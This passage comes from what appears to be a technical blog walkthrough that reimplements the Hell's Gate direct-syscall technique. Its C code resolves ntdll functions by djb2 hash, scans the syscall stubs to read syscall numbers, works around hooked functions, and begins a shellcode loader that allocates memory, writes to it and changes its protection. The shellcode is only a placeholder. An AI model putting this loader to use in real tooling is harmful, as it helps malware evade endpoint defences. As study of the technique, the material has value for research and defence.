</span></span><span class="line"><span class="cl">                                        <span class="n">BYTE</span> <span class="n">low</span> <span class="o">=</span> <span class="o">*</span><span class="p">((</span><span class="n">PBYTE</span><span class="p">)</span><span class="n">pFunctionAddress</span> <span class="o">+</span> <span class="mi">4</span> <span class="o">+</span> <span class="n">cw</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">                                        <span class="n">pVxTableEntry</span><span class="o">-&gt;</span><span class="n">wSystemCall</span> <span class="o">=</span> <span class="p">(</span><span class="n">high</span> <span class="o">&lt;&lt;</span> <span class="mi">8</span><span class="p">)</span> <span class="o">|</span> <span class="n">low</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">                                        <span class="k">break</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">                                <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">                                <span class="n">cw</span><span class="o">++</span><span class="p">;</span>
</span></span></code></pre></div><p>If we look at this in <code>sickle</code> this is indeed <code>mov r10, rcx</code>. However, based on the output we may be able to just use <code>0x4c, 0x8b, and 0xd1</code>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">┌──<span class="o">(</span>wetw0rk㉿kali<span class="o">)</span>-<span class="o">[</span>/opt/Sickle/src<span class="o">]</span>
</span></span><span class="line"><span class="cl">└─$ python3 sickle.py -m asm_shell -f c 
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> ASM Shell loaded <span class="k">for</span> x64 architecture
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">sickle &gt; d 4c8bd1b80000
</span></span><span class="line"><span class="cl">4c8bd1                           -&gt; mov r10, rcx
</span></span></code></pre></div><p>If we update our PoC once more.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="n">BOOL</span> <span class="nf">GetVxTableEntry</span><span class="p">(</span><span class="n">PVOID</span> <span class="n">pModuleBase</span><span class="p">,</span> <span class="n">PIMAGE_EXPORT_DIRECTORY</span> <span class="n">pImageExportDirectory</span><span class="p">,</span> <span class="n">PVX_TABLE_ENTRY</span> <span class="n">pVxTableEntry</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="n">PDWORD</span> <span class="n">pdwAddressOfFunctions</span> <span class="o">=</span> <span class="p">(</span><span class="n">PDWORD</span><span class="p">)((</span><span class="n">PBYTE</span><span class="p">)</span><span class="n">pModuleBase</span> <span class="o">+</span> <span class="n">pImageExportDirectory</span><span class="o">-&gt;</span><span class="n">AddressOfFunctions</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="n">PDWORD</span> <span class="n">pdwAddressOfNames</span> <span class="o">=</span> <span class="p">(</span><span class="n">PDWORD</span><span class="p">)((</span><span class="n">PBYTE</span><span class="p">)</span><span class="n">pModuleBase</span> <span class="o">+</span> <span class="n">pImageExportDirectory</span><span class="o">-&gt;</span><span class="n">AddressOfNames</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="n">PWORD</span> <span class="n">pwAddressOfNameOrdinales</span> <span class="o">=</span> <span class="p">(</span><span class="n">PWORD</span><span class="p">)((</span><span class="n">PBYTE</span><span class="p">)</span><span class="n">pModuleBase</span> <span class="o">+</span> <span class="n">pImageExportDirectory</span><span class="o">-&gt;</span><span class="n">AddressOfNameOrdinals</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="n">WORD</span> <span class="n">cx</span> <span class="o">=</span> <span class="mh">0x00</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="n">WORD</span> <span class="n">cw</span> <span class="o">=</span> <span class="mh">0x00</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="n">PCHAR</span> <span class="n">pczFunctionName</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="n">PVOID</span> <span class="n">pFunctionAddress</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="p">(</span><span class="n">cx</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">cx</span> <span class="o">&lt;</span> <span class="n">pImageExportDirectory</span><span class="o">-&gt;</span><span class="n">NumberOfNames</span><span class="p">;</span> <span class="n">cx</span><span class="o">++</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="n">pczFunctionName</span> <span class="o">=</span> <span class="p">(</span><span class="n">PCHAR</span><span class="p">)((</span><span class="n">PBYTE</span><span class="p">)</span><span class="n">pModuleBase</span> <span class="o">+</span> <span class="n">pdwAddressOfNames</span><span class="p">[</span><span class="n">cx</span><span class="p">]);</span>
</span></span><span class="line"><span class="cl">        <span class="n">pFunctionAddress</span> <span class="o">=</span> <span class="p">(</span><span class="n">PBYTE</span><span class="p">)</span><span class="n">pModuleBase</span> <span class="o">+</span> <span class="n">pdwAddressOfFunctions</span><span class="p">[</span><span class="n">pwAddressOfNameOrdinales</span><span class="p">[</span><span class="n">cx</span><span class="p">]];</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="cm">/* We found the target function */</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="nf">djb2</span><span class="p">((</span><span class="n">PBYTE</span><span class="p">)</span><span class="n">pczFunctionName</span><span class="p">)</span> <span class="o">==</span> <span class="n">pVxTableEntry</span><span class="o">-&gt;</span><span class="n">dwHash</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            
</span></span><span class="line"><span class="cl">            <span class="n">pVxTableEntry</span><span class="o">-&gt;</span><span class="n">pAddress</span> <span class="o">=</span> <span class="n">pFunctionAddress</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">            <span class="k">while</span> <span class="p">(</span><span class="n">TRUE</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">                <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;[*] Found target function: %s (0x%p)</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">pczFunctionName</span><span class="p">,</span> <span class="n">pFunctionAddress</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">                <span class="k">if</span> <span class="p">(</span><span class="o">*</span><span class="p">((</span><span class="n">PBYTE</span><span class="p">)</span><span class="n">pFunctionAddress</span> <span class="o">+</span> <span class="n">cw</span><span class="p">)</span> <span class="o">==</span> <span class="mh">0x4c</span>
</span></span><span class="line"><span class="cl">                    <span class="o">&amp;&amp;</span> <span class="o">*</span><span class="p">((</span><span class="n">PBYTE</span><span class="p">)</span><span class="n">pFunctionAddress</span> <span class="o">+</span> <span class="mi">1</span> <span class="o">+</span> <span class="n">cw</span><span class="p">)</span> <span class="o">==</span> <span class="mh">0x8b</span>
</span></span><span class="line"><span class="cl">                    <span class="o">&amp;&amp;</span> <span class="o">*</span><span class="p">((</span><span class="n">PBYTE</span><span class="p">)</span><span class="n">pFunctionAddress</span> <span class="o">+</span> <span class="mi">2</span> <span class="o">+</span> <span class="n">cw</span><span class="p">)</span> <span class="o">==</span> <span class="mh">0xd1</span>
</span></span><span class="line"><span class="cl">                    <span class="o">&amp;&amp;</span> <span class="o">*</span><span class="p">((</span><span class="n">PBYTE</span><span class="p">)</span><span class="n">pFunctionAddress</span> <span class="o">+</span> <span class="mi">3</span> <span class="o">+</span> <span class="n">cw</span><span class="p">)</span> <span class="o">==</span> <span class="mh">0xb8</span>
</span></span><span class="line"><span class="cl">                    <span class="o">&amp;&amp;</span> <span class="o">*</span><span class="p">((</span><span class="n">PBYTE</span><span class="p">)</span><span class="n">pFunctionAddress</span> <span class="o">+</span> <span class="mi">6</span> <span class="o">+</span> <span class="n">cw</span><span class="p">)</span> <span class="o">==</span> <span class="mh">0x00</span>
</span></span><span class="line"><span class="cl">                    <span class="o">&amp;&amp;</span> <span class="o">*</span><span class="p">((</span><span class="n">PBYTE</span><span class="p">)</span><span class="n">pFunctionAddress</span> <span class="o">+</span> <span class="mi">7</span> <span class="o">+</span> <span class="n">cw</span><span class="p">)</span> <span class="o">==</span> <span class="mh">0x00</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">                    <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;[+] Syscall found @{0x%p}</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="p">(</span><span class="n">PVOID</span><span class="p">)((</span><span class="kt">intptr_t</span><span class="p">)</span><span class="n">pFunctionAddress</span> <span class="o">+</span> <span class="n">cw</span><span class="p">));</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">                    <span class="nf">getchar</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">                <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">                <span class="n">cw</span><span class="o">++</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">            <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">TRUE</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p>We can see that this syscall is successfully located the instructions.</p>
<p>
    <figure>
      <img class="my-0 rounded-md" loading="lazy" src="/EzekielsWheelScreenshots/lookup_worked.png" alt="alt text" />
      
    </figure>
</p>
<p>Finally, we see that if we locate this sequence of bytes / instructions we write the syscall to the <code>VX_TABLE</code> structure.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl">                                        <span class="n">BYTE</span> <span class="n">high</span> <span class="o">=</span> <span class="o">*</span><span class="p">((</span><span class="n">PBYTE</span><span class="p">)</span><span class="n">pFunctionAddress</span> <span class="o">+</span> <span class="mi">5</span> <span class="o">+</span> <span class="n">cw</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">                                        <span class="n">BYTE</span> <span class="n">low</span> <span class="o">=</span> <span class="o">*</span><span class="p">((</span><span class="n">PBYTE</span><span class="p">)</span><span class="n">pFunctionAddress</span> <span class="o">+</span> <span class="mi">4</span> <span class="o">+</span> <span class="n">cw</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">                                        <span class="n">pVxTableEntry</span><span class="o">-&gt;</span><span class="n">wSystemCall</span> <span class="o">=</span> <span class="p">(</span><span class="n">high</span> <span class="o">&lt;&lt;</span> <span class="mi">8</span><span class="p">)</span> <span class="o">|</span> <span class="n">low</span><span class="p">;</span>
</span></span></code></pre></div><p>Not sure exactly why we must store it like this (we may be able to re-implement it), however in WinDBG we can see when we read from this value it&rsquo;s pretty straight-forward.</p>
<p>
    <figure>
      <img class="my-0 rounded-md" loading="lazy" src="/EzekielsWheelScreenshots/syscall.png" alt="alt text" />
      
    </figure>
</p>
<p>We have now implemented our own version of this function to have an understanding of its underlying operations.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="n">BOOL</span> <span class="nf">GetVxTableEntry</span><span class="p">(</span><span class="n">PVOID</span> <span class="n">pModuleBase</span><span class="p">,</span> <span class="n">PIMAGE_EXPORT_DIRECTORY</span> <span class="n">pImageExportDirectory</span><span class="p">,</span> <span class="n">PVX_TABLE_ENTRY</span> <span class="n">pVxTableEntry</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="n">PDWORD</span> <span class="n">pdwAddressOfFunctions</span> <span class="o">=</span> <span class="p">(</span><span class="n">PDWORD</span><span class="p">)((</span><span class="n">PBYTE</span><span class="p">)</span><span class="n">pModuleBase</span> <span class="o">+</span> <span class="n">pImageExportDirectory</span><span class="o">-&gt;</span><span class="n">AddressOfFunctions</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="n">PDWORD</span> <span class="n">pdwAddressOfNames</span> <span class="o">=</span> <span class="p">(</span><span class="n">PDWORD</span><span class="p">)((</span><span class="n">PBYTE</span><span class="p">)</span><span class="n">pModuleBase</span> <span class="o">+</span> <span class="n">pImageExportDirectory</span><span class="o">-&gt;</span><span class="n">AddressOfNames</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="n">PWORD</span> <span class="n">pwAddressOfNameOrdinales</span> <span class="o">=</span> <span class="p">(</span><span class="n">PWORD</span><span class="p">)((</span><span class="n">PBYTE</span><span class="p">)</span><span class="n">pModuleBase</span> <span class="o">+</span> <span class="n">pImageExportDirectory</span><span class="o">-&gt;</span><span class="n">AddressOfNameOrdinals</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="n">BYTE</span> <span class="n">high</span> <span class="o">=</span> <span class="mh">0x00</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="n">BYTE</span> <span class="n">low</span> <span class="o">=</span> <span class="mh">0x00</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="n">WORD</span> <span class="n">cx</span> <span class="o">=</span> <span class="mh">0x00</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="n">WORD</span> <span class="n">cw</span> <span class="o">=</span> <span class="mh">0x00</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="n">PCHAR</span> <span class="n">pczFunctionName</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="n">PVOID</span> <span class="n">pFunctionAddress</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="p">(</span><span class="n">cx</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">cx</span> <span class="o">&lt;</span> <span class="n">pImageExportDirectory</span><span class="o">-&gt;</span><span class="n">NumberOfNames</span><span class="p">;</span> <span class="n">cx</span><span class="o">++</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="n">pczFunctionName</span> <span class="o">=</span> <span class="p">(</span><span class="n">PCHAR</span><span class="p">)((</span><span class="n">PBYTE</span><span class="p">)</span><span class="n">pModuleBase</span> <span class="o">+</span> <span class="n">pdwAddressOfNames</span><span class="p">[</span><span class="n">cx</span><span class="p">]);</span>
</span></span><span class="line"><span class="cl">        <span class="n">pFunctionAddress</span> <span class="o">=</span> <span class="p">(</span><span class="n">PBYTE</span><span class="p">)</span><span class="n">pModuleBase</span> <span class="o">+</span> <span class="n">pdwAddressOfFunctions</span><span class="p">[</span><span class="n">pwAddressOfNameOrdinales</span><span class="p">[</span><span class="n">cx</span><span class="p">]];</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="cm">/* We found the target function */</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="nf">djb2</span><span class="p">((</span><span class="n">PBYTE</span><span class="p">)</span><span class="n">pczFunctionName</span><span class="p">)</span> <span class="o">==</span> <span class="n">pVxTableEntry</span><span class="o">-&gt;</span><span class="n">dwHash</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            
</span></span><span class="line"><span class="cl">            <span class="n">pVxTableEntry</span><span class="o">-&gt;</span><span class="n">pAddress</span> <span class="o">=</span> <span class="n">pFunctionAddress</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">            <span class="cm">/* Quick and dirty fix in case the function has been hooked */</span>
</span></span><span class="line"><span class="cl">            <span class="k">while</span> <span class="p">(</span><span class="n">TRUE</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">                <span class="cm">/* Check if a syscall instruction has been reached, if so we are too deep into the function */</span>
</span></span><span class="line"><span class="cl">                <span class="k">if</span> <span class="p">(</span><span class="o">*</span><span class="p">((</span><span class="n">PBYTE</span><span class="p">)</span><span class="n">pFunctionAddress</span> <span class="o">+</span> <span class="n">cw</span><span class="p">)</span> <span class="o">==</span> <span class="mh">0x0f</span> <span class="o">&amp;&amp;</span> <span class="o">*</span><span class="p">((</span><span class="n">PBYTE</span><span class="p">)</span><span class="n">pFunctionAddress</span> <span class="o">+</span> <span class="n">cw</span> <span class="o">+</span> <span class="mi">1</span><span class="p">)</span> <span class="o">==</span> <span class="mh">0x05</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">                    <span class="k">return</span> <span class="n">FALSE</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">                <span class="cm">/* Check if a ret instruction has been reached, if so we read to deep into the function */</span>
</span></span><span class="line"><span class="cl">                <span class="k">if</span> <span class="p">(</span><span class="o">*</span><span class="p">((</span><span class="n">PBYTE</span><span class="p">)</span><span class="n">pFunctionAddress</span> <span class="o">+</span> <span class="n">cw</span><span class="p">)</span> <span class="o">==</span> <span class="mh">0xc3</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">                    <span class="k">return</span> <span class="n">FALSE</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">                <span class="k">if</span> <span class="p">(</span><span class="o">*</span><span class="p">((</span><span class="n">PBYTE</span><span class="p">)</span><span class="n">pFunctionAddress</span> <span class="o">+</span> <span class="n">cw</span><span class="p">)</span> <span class="o">==</span> <span class="mh">0x4c</span>
</span></span><span class="line"><span class="cl">                    <span class="o">&amp;&amp;</span> <span class="o">*</span><span class="p">((</span><span class="n">PBYTE</span><span class="p">)</span><span class="n">pFunctionAddress</span> <span class="o">+</span> <span class="mi">1</span> <span class="o">+</span> <span class="n">cw</span><span class="p">)</span> <span class="o">==</span> <span class="mh">0x8b</span>
</span></span><span class="line"><span class="cl">                    <span class="o">&amp;&amp;</span> <span class="o">*</span><span class="p">((</span><span class="n">PBYTE</span><span class="p">)</span><span class="n">pFunctionAddress</span> <span class="o">+</span> <span class="mi">2</span> <span class="o">+</span> <span class="n">cw</span><span class="p">)</span> <span class="o">==</span> <span class="mh">0xd1</span>
</span></span><span class="line"><span class="cl">                    <span class="o">&amp;&amp;</span> <span class="o">*</span><span class="p">((</span><span class="n">PBYTE</span><span class="p">)</span><span class="n">pFunctionAddress</span> <span class="o">+</span> <span class="mi">3</span> <span class="o">+</span> <span class="n">cw</span><span class="p">)</span> <span class="o">==</span> <span class="mh">0xb8</span>
</span></span><span class="line"><span class="cl">                    <span class="o">&amp;&amp;</span> <span class="o">*</span><span class="p">((</span><span class="n">PBYTE</span><span class="p">)</span><span class="n">pFunctionAddress</span> <span class="o">+</span> <span class="mi">6</span> <span class="o">+</span> <span class="n">cw</span><span class="p">)</span> <span class="o">==</span> <span class="mh">0x00</span>
</span></span><span class="line"><span class="cl">                    <span class="o">&amp;&amp;</span> <span class="o">*</span><span class="p">((</span><span class="n">PBYTE</span><span class="p">)</span><span class="n">pFunctionAddress</span> <span class="o">+</span> <span class="mi">7</span> <span class="o">+</span> <span class="n">cw</span><span class="p">)</span> <span class="o">==</span> <span class="mh">0x00</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">                    <span class="n">high</span> <span class="o">=</span> <span class="o">*</span><span class="p">((</span><span class="n">PBYTE</span><span class="p">)</span><span class="n">pFunctionAddress</span> <span class="o">+</span> <span class="mi">5</span> <span class="o">+</span> <span class="n">cw</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">                    <span class="n">low</span> <span class="o">=</span> <span class="o">*</span><span class="p">((</span><span class="n">PBYTE</span><span class="p">)</span><span class="n">pFunctionAddress</span> <span class="o">+</span> <span class="mi">4</span> <span class="o">+</span> <span class="n">cw</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">                    
</span></span><span class="line"><span class="cl">                    <span class="n">pVxTableEntry</span><span class="o">-&gt;</span><span class="n">wSystemCall</span> <span class="o">=</span> <span class="p">(</span><span class="n">high</span> <span class="o">&lt;&lt;</span> <span class="mi">8</span><span class="p">)</span> <span class="o">|</span> <span class="n">low</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">                    <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;[*] %s syscall start found @{0x%p}</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">pczFunctionName</span><span class="p">,</span> <span class="p">(</span><span class="n">PVOID</span><span class="p">)((</span><span class="kt">intptr_t</span><span class="p">)</span><span class="n">pFunctionAddress</span> <span class="o">+</span> <span class="n">cw</span><span class="p">));</span>
</span></span><span class="line"><span class="cl">                    <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;</span><span class="se">\t</span><span class="s">[*] High: 0x%x</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">high</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">                    <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;</span><span class="se">\t</span><span class="s">[*] Low: 0x%x</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">low</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">                    <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;</span><span class="se">\t</span><span class="s">[*] Syscall: 0x%x</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">pVxTableEntry</span><span class="o">-&gt;</span><span class="n">wSystemCall</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">                    <span class="k">break</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">                <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">                <span class="n">cw</span><span class="o">++</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">            <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">TRUE</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p>With that we can introduce the rest of the main function.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl">    <span class="n">vxTable</span><span class="p">.</span><span class="n">NtAllocateVirtualMemory</span><span class="p">.</span><span class="n">dwHash</span> <span class="o">=</span> <span class="mh">0xf5bd373480a6b89b</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nf">GetVxTableEntry</span><span class="p">(</span><span class="n">pNtdllEntry</span><span class="o">-&gt;</span><span class="n">DllBase</span><span class="p">,</span> <span class="n">pImageExportDirectory</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">vxTable</span><span class="p">.</span><span class="n">NtAllocateVirtualMemory</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="mh">0x01</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="n">vxTable</span><span class="p">.</span><span class="n">NtCreateThreadEx</span><span class="p">.</span><span class="n">dwHash</span> <span class="o">=</span> <span class="mh">0x64dc7db288c5015f</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nf">GetVxTableEntry</span><span class="p">(</span><span class="n">pNtdllEntry</span><span class="o">-&gt;</span><span class="n">DllBase</span><span class="p">,</span> <span class="n">pImageExportDirectory</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">vxTable</span><span class="p">.</span><span class="n">NtCreateThreadEx</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="mh">0x1</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="n">vxTable</span><span class="p">.</span><span class="n">NtProtectVirtualMemory</span><span class="p">.</span><span class="n">dwHash</span> <span class="o">=</span> <span class="mh">0x858bcb1046fb6a37</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nf">GetVxTableEntry</span><span class="p">(</span><span class="n">pNtdllEntry</span><span class="o">-&gt;</span><span class="n">DllBase</span><span class="p">,</span> <span class="n">pImageExportDirectory</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">vxTable</span><span class="p">.</span><span class="n">NtProtectVirtualMemory</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="mh">0x1</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="n">vxTable</span><span class="p">.</span><span class="n">NtWaitForSingleObject</span><span class="p">.</span><span class="n">dwHash</span> <span class="o">=</span> <span class="mh">0xc6a2fa174e551bcb</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nf">GetVxTableEntry</span><span class="p">(</span><span class="n">pNtdllEntry</span><span class="o">-&gt;</span><span class="n">DllBase</span><span class="p">,</span> <span class="n">pImageExportDirectory</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">vxTable</span><span class="p">.</span><span class="n">NtWaitForSingleObject</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="mh">0x1</span><span class="p">;</span>
</span></span></code></pre></div>

<h2 class="relative group">Understanding Payload() 
    <div id="understanding-payload" class="anchor"></div>
    
    <span
        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
            style="text-decoration-line: none !important;" href="#understanding-payload" aria-label="Anchor">#</a>
    </span>        
    
</h2>
<p>Finally, we&rsquo;re at the final function call in the <code>main()</code> function.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="nf">Payload</span><span class="p">(</span><span class="o">&amp;</span><span class="n">Table</span><span class="p">);</span>
</span></span></code></pre></div><p>We can see that this is, yet another custom function implemented by the author. However, we see three additional custom functions <code>HellsGate</code>, <code>HellsDescent</code>, and <code>VxMoveMemory</code>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="n">BOOL</span> <span class="nf">Payload</span><span class="p">(</span><span class="n">PVX_TABLE</span> <span class="n">pVxTable</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="n">NTSTATUS</span> <span class="n">status</span> <span class="o">=</span> <span class="mh">0x00000000</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="kt">char</span> <span class="n">shellcode</span><span class="p">[]</span> <span class="o">=</span> <span class="s">&#34;</span><span class="se">\x90\x90\x90\x90\xcc\xcc\xcc\xcc\xc3</span><span class="s">&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="c1">// Allocate memory for the shellcode
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="n">PVOID</span> <span class="n">lpAddress</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="n">SIZE_T</span> <span class="n">sDataSize</span> <span class="o">=</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">shellcode</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="nf">HellsGate</span><span class="p">(</span><span class="n">pVxTable</span><span class="o">-&gt;</span><span class="n">NtAllocateVirtualMemory</span><span class="p">.</span><span class="n">wSystemCall</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="n">status</span> <span class="o">=</span> <span class="nf">HellDescent</span><span class="p">((</span><span class="n">HANDLE</span><span class="p">)</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">lpAddress</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">sDataSize</span><span class="p">,</span> <span class="n">MEM_COMMIT</span><span class="p">,</span> <span class="n">PAGE_READWRITE</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="c1">// Write Memory
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="nf">VxMoveMemory</span><span class="p">(</span><span class="n">lpAddress</span><span class="p">,</span> <span class="n">shellcode</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">shellcode</span><span class="p">));</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="c1">// Change page permissions
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="n">ULONG</span> <span class="n">ulOldProtect</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="nf">HellsGate</span><span class="p">(</span><span class="n">pVxTable</span><span class="o">-&gt;</span><span class="n">NtProtectVirtualMemory</span><span class="p">.</span><span class="n">wSystemCall</span><span class="p">);</span>
